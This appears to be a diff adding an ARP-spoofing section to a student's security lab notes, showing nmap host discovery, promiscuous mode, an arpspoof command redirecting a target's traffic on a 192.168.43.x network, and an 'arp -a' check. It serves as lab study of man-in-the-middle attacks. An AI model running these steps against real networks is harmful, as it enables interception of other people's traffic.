@@ -24,3 +24,28 @@ Nmap -sV 192.168.43.28 to confirm the host up
 
 ## Enable promiscious mode on all interface
 ![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/p6.png)
+
+
+
+
+## Arpspoof
+
+
+Directing the traffic to my network
+
+
+
+
+Lauch the attack with - sudo arpspoof- -i wlan0 -t 192.168.43.223 -r 192.168.43.1
+![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/c1.png)
+
+
+
+How to know the network to attack - sudo nmap 192.168.43.0-255
+
+![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/c2.png)
+
+
+To confirm the attack arp -a
+
+![alt text](https://github.com/lucassayodemi/ProblemSets/blob/main/sayo/picture/c3.png)
